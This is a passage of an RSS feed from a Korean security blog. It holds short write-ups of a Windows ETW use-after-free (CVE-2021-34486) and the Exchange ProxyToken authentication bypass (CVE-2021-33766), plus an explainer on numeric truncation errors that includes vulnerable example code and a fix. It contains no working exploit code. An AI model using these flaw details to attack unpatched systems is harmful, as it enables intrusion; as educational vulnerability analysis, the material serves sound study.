      <pubDate>Thu, 02 Sep 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.pixiepointsecurity.com/blog/cve-2021-34486.ht</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.pixiepointsecurity.com/blog/cve-2021-34486.html">cve-2021-34486</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows 10(x64) 21H1(OS &#xBE4C;&#xB4DC; 19043.1083, 2021&#xB144; 7&#xC6D4; 7&#xC77C; KB5004945 &#xB204;&#xC801; &#xC5C5;&#xB370;&#xC774;&#xD2B8;)</li><li>Windows 10(x64) 21H1(OS &#xBE4C;&#xB4DC; 19043.1052, 2021&#xB144; 6&#xC6D4; KB5003637 &#xB204;&#xC801; &#xC5C5;&#xB370;&#xC774;&#xD2B8;)</li><li>Windows 10(x64) 21H1(OS &#xBE4C;&#xB4DC; 19043.1023, 2021&#xB144; 5&#xC6D4; KB5003214 &#xB204;&#xC801; &#xC5C5;&#xB370;&#xC774;&#xD2B8;)</li><li>Windows 10(x64) 21H1(OS &#xBE4C;&#xB4DC; 19043.985, 2021&#xB144; 5&#xC6D4; KB5003173 &#xB204;&#xC801; &#xC5C5;&#xB370;&#xC774;&#xD2B8;)</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Windows <a href="https://docs.microsoft.com/ko-kr/windows/win32/etw/event-tracing-portal">ETW(Event Tracing for Windows, &#xC774;&#xBCA4;&#xD2B8; &#xCD94;&#xC801;)</a> &#xB294; &#xC720;&#xC800; &#xBAA8;&#xB4DC; &#xC5B4;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC744; &#xB514;&#xBC84;&#xAE45;&#xD558;&#xAE30; &#xC704;&#xD574; &#xCEE4;&#xB110;&#xACFC; &#xC5B4;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158; &#xC774;&#xBCA4;&#xD2B8;&#xB97C; &#xB85C;&#xAE45;&#xD558;&#xB294; &#xC11C;&#xBE44;&#xC2A4;&#xC785;&#xB2C8;&#xB2E4;.</p><p>ETW&#xB294; &#xC8FC;&#xAE30;&#xC801;&#xC73C;&#xB85C; logging state&#xB97C; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xD558;&#xAE30; &#xC704;&#xD574; &#xCEE4;&#xB110;(<code>ntoskrnl.exe</code>)&#xC5D0; system call&#xC744; &#xD558;&#xB294;&#xB370;, &#xC774;&#xB54C; &#xD2B9;&#xC815; &#xC870;&#xAC74;&#xC5D0;&#xC11C; &#xC784;&#xC758; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xB294; UAF &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><p>UAF&#xB97C; &#xD1B5;&#xD574; &#xC81C;&#xC5B4; &#xAC00;&#xB2A5;&#xD55C; <code>0x30</code> bytes &#xD06C;&#xAE30;&#xC758; _CONTEXTINFO &#xAD6C;&#xC870;&#xCCB4;&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">CONTEXTINFO</span></span><span class="hljs-class">{</span>WORK_QUEUE_ITEM WorkItem;ULONG64Unknown;USHORTLoggerId;UCHARPadding[<span class="hljs-number">6</span>];} CONTEXTINFO, *PCONTEXTINFO;</code></pre><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; &#xCD1D; &#xC138; &#xBC88;&#xC758; logging state &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xC694;&#xCCAD;&#xC744; &#xD1B5;&#xD574; &#xD2B8;&#xB9AC;&#xAC70; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xCCAB; &#xBC88;&#xC9F8; &#xC694;&#xCCAD;&#xC5D0;&#xC11C; &#xCEE4;&#xB110;&#xC740; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xB3D9;&#xC791;&#xD569;&#xB2C8;&#xB2E4;.</p><ol><li>ntoskrnl&#xC740; <code>LoggerId</code>&#xC5D0; &#xD574;&#xB2F9;&#xD558;&#xB294; <code>LoggerContext</code>&#xB97C; &#xCC3E;&#xC544; &#xBAA8;&#xB4E0; <code>Guids</code>&#xAC00; <code>LoggerContext</code>&#xC758; &#xC54C;&#xB9BC; &#xC561;&#xC138;&#xC2A4; &#xAD8C;&#xD55C;&#xC744; &#xAC16;&#xB3C4;&#xB85D; &#xD569;&#xB2C8;&#xB2E4;.</li><li>&#xD0C0;&#xC774;&#xBA38; &#xCF5C;&#xBC31; &#xB8E8;&#xD2F4; <code>PeriodicCaptureStateTimerCallback()</code> &#xC5D0;&#xC11C;&#xB294; <code>CONTEXTINFO TimerContextInfo</code> &#xAC1D;&#xCCB4;&#xB97C; &#xD560;&#xB2F9;&#xD558;&#xACE0; <code>SendCaptureStateNotificationsWorker(PCONTEXTINFO TimerContentInfo)</code> &#xCF5C;&#xBC31; &#xB8E8;&#xD2F4;&#xC744; &#xB300;&#xAE30;&#xC5F4;&#xC5D0; &#xB123;&#xC2B5;&#xB2C8;&#xB2E4;,</li><li><code>SendCaptureStateNotificationsWorker()</code>&#xC740; &#xC54C;&#xB9BC; &#xB370;&#xC774;&#xD130; &#xD328;&#xD0B7;&#xC744; &#xBE4C;&#xB4DC;&#xD558;&#xACE0; &#xBAA8;&#xB4E0; <code>Guids</code>&#xC5D0; &#xBCF4;&#xB0C5;&#xB2C8;&#xB2E4;.</li></ol><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; &#xCCAB; &#xBC88;&#xC9F8; &#xC694;&#xCCAD; &#xC774;&#xD6C4; &#xB450; &#xBC88;&#xC9F8; &#xC694;&#xCCAD;&#xC5D0;&#xC11C; <code>Guid</code>&#xC911; &#xD558;&#xB098;&#xB77C;&#xB3C4; <code>LoggerContext</code>&#xC758; &#xC54C;&#xB9BC; &#xC561;&#xC138;&#xC2A4; &#xAD8C;&#xD55C;&#xC774; &#xC5C6;&#xB294; &#xACBD;&#xC6B0; <code>LoggerContext&#x2192;NumOfGuids</code>&#xB97C; 0&#xC73C;&#xB85C; &#xC124;&#xC815;&#xD574; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. &#xB450; &#xBC88;&#xC9F8; &#xC694;&#xCCAD;&#xC5D0;&#xC11C; <code>SendCaptureStateNotificationsWorker()</code> &#xB8E8;&#xD2F4;&#xC740; &#xBA3C;&#xC800; &#xD574;&#xB2F9; <code>LoggerContext</code>&#xB97C; &#xAC80;&#xC0C9;&#xD558;&#xB294;&#xB370; <code>LoggerContext&#x2192;NumOfGuids</code>&#xAC00; 0&#xC774;&#xBA74; &#xD560;&#xB2F9;&#xB41C; <code>TimerContextInfo</code>&#xB97C; &#xD574;&#xC81C;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xD6C4; &#xC138; &#xBC88;&#xC9F8; &#xC694;&#xCCAD;&#xC5D0;&#xC11C; <code>LoggerContext_-&gt;ExTimer</code>&#xC5D0; &#xC774;&#xBBF8; &#xD574;&#xC81C;&#xB41C; <code>TimerContextInfo</code> &#xAC1D;&#xCCB4;&#xAC00; &#xC800;&#xC7A5;&#xB418;&#xC5B4; &#xC788;&#xC5B4; &#xC774;&#xB97C; &#xCC38;&#xC870;&#xD574; &#xC0C8;&#xB85C;&#xC6B4; &#xD0C0;&#xC774;&#xBA38; &#xC791;&#xC5C5; <code>ExSetTimer()</code>&#xC744; &#xC2DC;&#xC791;&#xD558;&#xACE0; &#xACB0;&#xACFC;&#xC801;&#xC73C;&#xB85C; &#xD574;&#xC81C;&#xB41C; &#xD480;&#xC774; &#xCC38;&#xC870;&#xB418;&#xC5B4; UAF&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/uaf/">uaf</category>
      
      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/cve-2021-34486/">cve-2021-34486</category>
      
      
      <comments>https://hackyboiz.github.io/2021/09/02/l0ch/2021-09-02/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[해키피디아] Numeric Truncation Error</title>
      <link>https://hackyboiz.github.io/2021/09/01/y00n_nms/numeric-truncation-error/</link>
      <guid>https://hackyboiz.github.io/2021/09/01/y00n_nms/numeric-truncation-error/</guid>
      <pubDate>Wed, 01 Sep 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;Numeric Truncation Error&amp;#xB294; &amp;#xAE30;&amp;#xBCF8; &amp;#xC694;&amp;#xC18C;&amp;#xAC00; &amp;#xB354; &amp;#xC791;&amp;#xC740; &amp;#xD06C;&amp;#xAE30;&amp;#xC758; &amp;#xAE30;&amp;#x</description>
        
      
      
      
      <content:encoded><![CDATA[<p>Numeric Truncation Error&#xB294; &#xAE30;&#xBCF8; &#xC694;&#xC18C;&#xAC00; &#xB354; &#xC791;&#xC740; &#xD06C;&#xAE30;&#xC758; &#xAE30;&#xBCF8; &#xC694;&#xC18C;&#xB85C; &#xBCC0;&#xD658;&#xB418;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xB370;&#xC774;&#xD130;&#xAC00; &#xC190;&#xC2E4;&#xB418;&#xC5B4; &#xC6D0;&#xB798; &#xAC12;&#xACFC; &#xAC19;&#xC9C0; &#xC54A;&#xC740; &#xC608;&#xC0C1;&#xD558;&#xC9C0; &#xBABB;&#xD55C; &#xAC12;&#xC73C;&#xB85C; &#xC800;&#xC7A5;&#xB420; &#xB54C; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xD504;&#xB85C;&#xADF8;&#xB798;&#xBA38;&#xB294; &#xB2F9;&#xC5F0;&#xD788; &#xC815;&#xC218; &#xBCC0;&#xD658; &#xBC0F; &#xACC4;&#xC0B0;&#xC774; &#xC815;&#xD655;&#xD558;&#xACE0; &#xC218;&#xD559; &#xBC95;&#xCE59;&#xC744; &#xC900;&#xC218;&#xD560; &#xAC83;&#xC774;&#xB77C;&#xACE0; &#xAC00;&#xC815;&#xD558;&#xC9C0;&#xB9CC;, &#xCEF4;&#xD4E8;&#xD130;&#xB294; &#xC77C;&#xBC18;&#xC801;&#xC73C;&#xB85C; &#xC815;&#xC218;&#xB97C; &#xACE0;&#xC815; &#xAE38;&#xC774; &#xBE44;&#xD2B8;&#xC5D0; &#xD3EC;&#xD568;&#xB41C; &#xC774;&#xC9C4;&#xAC12;&#xC73C;&#xB85C; &#xD45C;&#xD604;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC624;&#xB958;&#xAC00; &#xBC1C;&#xC0DD;&#xD560; &#xAE30;&#xD68C;&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC608;&#xB97C; &#xB4E4;&#xC5B4; 16bit&#xB85C; &#xC22B;&#xC790; 256&#xC744; &#xD45C;&#xD604;&#xD55C;&#xB2E4;&#xBA74; <code>000000100000000</code> &#xC73C;&#xB85C; 1 &#xB2E4;&#xC74C;&#xC5D0; &#xC624;&#xB978;&#xCABD;&#xC5D0; 8&#xAC1C;&#xC758; 0&#xC73C;&#xB85C; &#xD45C;&#xD604;&#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; 8bit&#xB85C; &#xBCC0;&#xD658;&#xD558;&#xAC8C; &#xB418;&#xBA74; &#xC0C1;&#xC704; 8bit&#xAC00; &#xC190;&#xC2E4;&#xB418;&#xC5B4; <code>00000000</code>&#xB9CC; &#xB0A8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-keyword">int</span> intPrimitive;<span class="hljs-keyword">short</span> shortPrimitive;intPrimitive = (<span class="hljs-keyword">int</span>)(~((<span class="hljs-keyword">int</span>)<span class="hljs-number">0</span>) ^ (<span class="hljs-number">1</span> &lt;&lt; (<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>)*<span class="hljs-number">8</span><span class="hljs-number">-1</span>)));shortPrimitive = intPrimitive;<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Int MAXINT: %d\\nShort MAXINT: %d\\n&quot;</span>, intPrimitive, shortPrimitive);</code></pre><pre><code class="hljs c">Int MAXINT: <span class="hljs-number">2147483647</span>Short MAXINT: <span class="hljs-number">-1</span></code></pre><p>signed int&#xC758; &#xBC94;&#xC704;&#xB294; 32bit&#xB85C; 2,147,483,648 ~ 2,147,483,647&#xAE4C;&#xC9C0; &#xD45C;&#xD604; &#xAC00;&#xB2A5;&#xD558;&#xACE0; signed short&#xB294; 16bit&#xB85C; 32,768 ~ 32,767&#xAE4C;&#xC9C0; &#xD45C;&#xD604; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;. <code>shortPrimitive = intPrimitive;</code> &#xC904;&#xB85C; int&#xAC00; short&#xB85C; &#xBCC0;&#xD658;&#xB418;&#xC5B4; &#xC800;&#xC7A5;&#xB429;&#xB2C8;&#xB2E4;.</p><p>2147483647&#xC778; <code>01111111111111111111111111111111</code>&#xAC00; 16bit&#xB85C; &#xBCC0;&#xD658;&#xB418;&#xBA74; &#xC0C1;&#xC704; 16bit&#xAC00; &#xC190;&#xC2E4;&#xB418;&#xC5B4; <code>1111111111111111</code>&#xC774; &#xB0A8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; shortPrimitive&#xC5D0; &#xC608;&#xC0C1;&#xD55C; &#xAC12;&#xC774; &#xC544;&#xB2CC; -1&#xC774; &#xC800;&#xC7A5;&#xB429;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/01/y00n_nms/numeric-truncation-error/image.png" alt="image"></p><p>&#xC774; &#xC608;&#xC0C1;&#xD558;&#xC9C0; &#xBABB;&#xD55C; &#xAC12;&#xC774; &#xBC30;&#xC5F4; &#xC778;&#xB371;&#xC2A4;, &#xB8E8;&#xD504; &#xCE74;&#xC6B4;&#xD130; &#xB610;&#xB294; &#xC0C1;&#xD0DC; &#xB370;&#xC774;&#xD130;&#xB85C; &#xC0AC;&#xC6A9;&#xB420; &#xB54C; &#xC608;&#xC0C1;&#xD558;&#xC9C0; &#xBABB;&#xD55C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xCD94;&#xAC00;&#xB85C; &#xBC1C;&#xC0DD;&#xD560; &#xC218; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC8FC;&#xC758;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xB2E4;&#xC74C; Java &#xC608;&#xC81C;&#xC5D0;&#xC11C; <code>updateSalesForProduct</code> &#xBA54;&#xC18C;&#xB4DC;&#xB294; &#xD2B9;&#xC815; &#xC81C;&#xD488;&#xC5D0; &#xB300;&#xD55C; &#xD310;&#xB9E4; &#xC815;&#xBCF4;&#xB97C; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xD558;&#xB294; &#xBE44;&#xC988;&#xB2C8;&#xC2A4; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158; &#xD074;&#xB798;&#xC2A4;&#xC758; &#xC77C;&#xBD80;&#xC785;&#xB2C8;&#xB2E4;. &#xC774; &#xBA54;&#xC11C;&#xB4DC;&#xB294; &#xC81C;&#xD488; ID&#xC640; &#xD310;&#xB9E4;&#xB41C; &#xAE08;&#xC561;&#xC744; &#xC778;&#xC218;&#xB85C; &#xBC1B;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC81C;&#xD488; ID&#xB294; &#xAC1C;&#xC218;&#xB97C; &#xC815;&#xC218;&#xB85C; &#xBC18;&#xD658;&#xD558;&#xB294; &#xC778;&#xBCA4;&#xD1A0;&#xB9AC; &#xAC1C;&#xCCB4;&#xC5D0;&#xC11C; &#xCD1D; &#xC81C;&#xD488; &#xAC1C;&#xC218;&#xB97C; &#xAC80;&#xC0C9;&#xD558;&#xB294; &#xB370; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;. &#xD310;&#xB9E4; &#xC218;&#xB97C; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xD558;&#xAE30; &#xC704;&#xD574; <code>sales</code> &#xAC1C;&#xCCB4;&#xC758; &#xBA54;&#xC11C;&#xB4DC;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xAE30; &#xC804;&#xC5D0; &#xBA54;&#xC11C;&#xB4DC; &#xC778;&#xC218;&#xC5D0; &#xB300;&#xD574; short &#xD615;&#xC2DD;&#xC774; &#xD544;&#xC694;&#xD558;&#xBBC0;&#xB85C; int &#xAC12;&#xC774; short&#xB85C; &#xBCC0;&#xD658;&#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs java">...<span class="hljs-comment">// update sales database for number of product sold with product ID </span><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">updateSalesForProduct</span><span class="hljs-params">(String productID, <span class="hljs-keyword">int</span> amountSold)</span> </span>{<span class="hljs-comment">// get the total number of products in inventory database </span><span class="hljs-keyword">int</span> productCount = inventory.getProductCount(productID);<span class="hljs-comment">// convert integer values to short, the method for the </span><span class="hljs-comment">// sales object requires the parameters to be of type short </span><span class="hljs-keyword">short</span> count = (<span class="hljs-keyword">short</span>) productCount;<span class="hljs-keyword">short</span> sold = (<span class="hljs-keyword">short</span>) amountSold;<span class="hljs-comment">// update sales database for product </span>sales.updateSalesCount(productID, count, sold);}...</code></pre><p>&#xC774;&#xB54C; &#xC815;&#xC218; &#xAC12;&#xC774; short&#xC5D0; &#xD5C8;&#xC6A9;&#xB418;&#xB294; &#xCD5C;&#xB313;&#xAC12;&#xBCF4;&#xB2E4; &#xD06C;&#xBA74;  Numeric Truncation Error&#xAC00; &#xBC1C;&#xC0DD;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB85C; &#xC778;&#xD574; &#xC608;&#xAE30;&#xCE58; &#xC54A;&#xC740; &#xACB0;&#xACFC;&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xAC70;&#xB098; &#xB370;&#xC774;&#xD130;&#xAC00; &#xC190;&#xC2E4;&#xB418;&#xAC70;&#xB098; &#xC190;&#xC0C1;&#xB418;&#xC5B4; &#xC774; &#xC608;&#xC2DC;&#xC758; &#xACBD;&#xC6B0; &#xD310;&#xB9E4; &#xB370;&#xC774;&#xD130;&#xBCA0;&#xC774;&#xC2A4;&#xAC00; &#xC798;&#xBABB;&#xB41C; &#xB370;&#xC774;&#xD130;&#xB85C; &#xC190;&#xC0C1;&#xB420; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>Numeric Truncation Error&#xB97C; &#xBC29;&#xC9C0;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C;&#xB294; &#xB354; &#xD070; &#xD06C;&#xAE30;&#xC758; &#xAE30;&#xBCF8; &#xC694;&#xC18C;&#xC5D0;&#xC11C; &#xB354; &#xC791;&#xC740; &#xD06C;&#xAE30;&#xC758; &#xAE30;&#xBCF8; &#xC694;&#xC18C;&#xC73C;&#xB85C;&#xC758; &#xBA85;&#xC2DC;&#xC801; &#xD615;&#xBCC0;&#xD658;&#xC774; &#xBC1C;&#xC0DD;&#xD558;&#xC9C0; &#xC54A;&#xB3C4;&#xB85D; &#xAD6C;&#xD604;&#xD558;&#xAC70;&#xB098; &#xB2E4;&#xC74C; &#xC608;&#xC81C;&#xCC98;&#xB7FC; &#xBA85;&#xC2DC;&#xC801; &#xD615;&#xBCC0;&#xD658; &#xBC0F; sales &#xBA54;&#xC11C;&#xB4DC; &#xD638;&#xCD9C; &#xC774;&#xC804;&#xC5D0; &#xAE30;&#xBCF8; &#xD615;&#xC2DD;&#xC758; &#xCD5C;&#xB313;&#xAC12;&#xBCF4;&#xB2E4; &#xC791;&#xC740; &#xC815;&#xC218;&#xAC12;&#xC774; &#xC788;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xB294; if &#xBB38;&#xC744; &#xCD94;&#xAC00;&#xB85C; &#xC791;&#xC131;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs java"><span class="hljs-comment">// maximum value for type short before converting </span><span class="hljs-keyword">if</span> ((productCount &lt; Short.MAX_VALUE) &amp;&amp; (amountSold &lt; Short.MAX_VALUE)) { ... }</code></pre>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Hackypedia/">Hackypedia</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/y00n-nms/">y00n_nms</category>
      
      <category domain="https://hackyboiz.github.io/tags/numeric-truncation-error/">numeric truncation error</category>
      
      
      <comments>https://hackyboiz.github.io/2021/09/01/y00n_nms/numeric-truncation-error/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2021-33766: AN AUTHENTICATION BYPASS IN MICROSOFT EXCHANGE SERVER</title>
      <link>https://hackyboiz.github.io/2021/08/31/fabu1ous/2021-08-31/</link>
      <guid>https://hackyboiz.github.io/2021/08/31/fabu1ous/2021-08-31/</guid>
      <pubDate>Tue, 31 Aug 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.zerodayinitiative.com/blog/2021/8/30/proxytok</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.zerodayinitiative.com/blog/2021/8/30/proxytoken-an-authentication-bypass-in-microsoft-exchange-server">PROXYTOKEN: AN AUTHENTICATION BYPASS IN MICROSOFT EXCHANGE SERVER</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Microsoft Exchange Server</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Microsoft Exchange Server&#xC5D0;&#xC11C; &#xC778;&#xC99D; &#xC6B0;&#xD68C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD1B5;&#xD574; &#xD574;&#xCEE4;&#xB294; &#xC778;&#xC99D; &#xC808;&#xCC28; &#xC5C6;&#xC774; &#xC784;&#xC758; &#xC0AC;&#xC6A9;&#xC790;&#xC758; &#xC774;&#xBA54;&#xC77C; &#xC218;&#xC2E0;&#xD568; &#xC124;&#xC815;&#xC744; &#xC870;&#xC791;&#xD574; &#xC774;&#xBA54;&#xC77C;&#xC744; &#xD0C8;&#xCDE8;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>Microsoft Exchange&#xB294; front-end&#xC640; back-end &#xC6F9;&#xC0AC;&#xC774;&#xD2B8;&#xB97C; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;. front-end&#xB294; &#xC8FC;&#xB85C; back-end&#xC758; proxy &#xAE30;&#xB2A5;&#xC744; &#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;. front-end&#xB294; &#xBAA8;&#xB4E0; post-authentication &#xC694;&#xCCAD;&#xC744; &#xC7AC;&#xAD6C;&#xC131;&#xD574; back-end&#xB85C; &#xC804;&#xB2EC;&#xD558;&#xACE0; back-end&#xB85C;&#xBD80;&#xD130; &#xC751;&#xB2F5;&#xC744; &#xC218;&#xC9D1;&#xD574; &#xB2E4;&#xC2DC; client&#xB85C; &#xC804;&#xB2EC;&#xD569;&#xB2C8;&#xB2E4;.</p><p>Microsoft Exchange&#xB294; &#x201C;Delegated Authentication&#x201D; &#xAE30;&#xB2A5;&#xC744; &#xC9C0;&#xC6D0;&#xD569;&#xB2C8;&#xB2E4;. <code>SecurityToken</code>&#xC774;&#xB77C;&#xB294; cookie&#xAC00; &#xC874;&#xC7AC;&#xD55C;&#xB2E4;&#xBA74; &#xC694;&#xCCAD;&#xC5D0; &#xB300;&#xD55C; &#xC801;&#xC808;&#xD55C; &#xC778;&#xC99D; &#xC808;&#xCC28;&#xB97C; front-end&#xAC00; &#xC544;&#xB2CC; back-end&#xAC00; &#xC218;&#xD589;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xC694;&#xCCAD;&#xC774; &#xB4E4;&#xC5B4;&#xC624;&#xBA74; front-end&#xB294; &#xC778;&#xC99D; &#xACFC;&#xC815;&#xC744; &#xAC70;&#xCE58;&#xC9C0; &#xC54A;&#xACE0; &#xADF8;&#xB300;&#xB85C; back-end&#xC5D0; &#xC804;&#xB2EC;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs xml">modules&gt; ...      <span class="hljs-tag">&lt;<span class="hljs-name">add</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;DelegatedAuthModule&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;Microsoft.Exchange.Configuration.DelegatedAuthentication.DelegatedAuthenticationModule, Microsoft.Exchange.Configuration.DelegatedAuth&quot;</span> <span class="hljs-attr">preCondition</span>=<span class="hljs-string">&quot;managedHandler&quot;</span> /&gt;</span> ...      <span class="hljs-comment">&lt;!-- Remove all DataCenter only modules by default. They will be enabled by enable-LiveIDForWebApplication.ps1 --&gt;</span>       <span class="hljs-tag">&lt;<span class="hljs-name">remove</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;DelegatedAuthModule&quot;</span> /&gt;</span>       <span class="hljs-tag">&lt;<span class="hljs-name">remove</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;OrgIdAuthenticationModule&quot;</span> /&gt;</span>       <span class="hljs-tag">&lt;<span class="hljs-name">remove</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;LiveIdBasicAuthModule&quot;</span> /&gt;</span>       <span class="hljs-tag">&lt;<span class="hljs-name">remove</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;OAuthAuthModule&quot;</span> /&gt;</span>     <span class="hljs-tag">&lt;/<span class="hljs-name">modules</span>&gt;</span></code></pre><p>&#xC704;&#xB294; back-end&#xC758; <code>/ecp/web.config</code>  &#xB0B4;&#xC6A9; &#xC77C;&#xBD80;&#xC785;&#xB2C8;&#xB2E4;. back-end&#xB294; &#x201C;Delegated Authentication&#x201D; &#xAE30;&#xB2A5;&#xC744; &#xC218;&#xD589;&#xD574;&#xC57C; &#xD560; <code>DelegatedAuthModule</code>&#xB97C; &#xB85C;&#xB4DC;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC989;, front-end&#xB294; back-end&#xAC00; &#xC694;&#xCCAD;&#xC758; &#xC778;&#xC99D;&#xC744; &#xCC98;&#xB9AC;&#xD560; &#xAC83;&#xC774;&#xB77C; &#xBBFF;&#xACE0; &#xC778;&#xC99D; &#xC808;&#xCC28; &#xC5C6;&#xC774; &#xC694;&#xCCAD;&#xC744; &#xC804;&#xB2EC;&#xD558;&#xC9C0;&#xB9CC; back-end&#xC5D0;&#xB294; &#xC778;&#xC99D;&#xC5D0; &#xC0AC;&#xC6A9;&#xB420; &#xBAA8;&#xB4C8;&#xC774; &#xC5C6;&#xC5B4; &#xC778;&#xC99D;&#xC744; &#xC218;&#xD589;&#xD560; &#xC218; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;. front-end&#xC640; back-end&#xC5D0;&#xC11C; &#xBAA8;&#xB450; &#xC778;&#xC99D;&#xB418;&#xC9C0; &#xC54A;&#xB294; &#xC694;&#xCCAD;&#xC744; &#xBCF4;&#xB0BC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/microsoft/">microsoft</category>
      
      <category domain="https://hackyboiz.github.io/tags/exchange/">exchange</category>
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/auth-bypass/">auth bypass</category>
      
      
      <comments>https://hackyboiz.github.io/2021/08/31/fabu1ous/2021-08-31/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] Razer 마우스 인식을 위한 설치 과정에서의 권한 상승 취약점 그리고 SteelSeries에서의 유사 취약점 </title>
      <link>https://hackyboiz.github.io/2021/08/27/j0ker/2021-08-27/</link>
      <guid>https://hackyboiz.github.io/2021/08/27/j0ker/2021-08-27/</guid>
      <pubDate>Fri, 27 Aug 2021 05:00:00 GMT</pubDate>
      
        
        
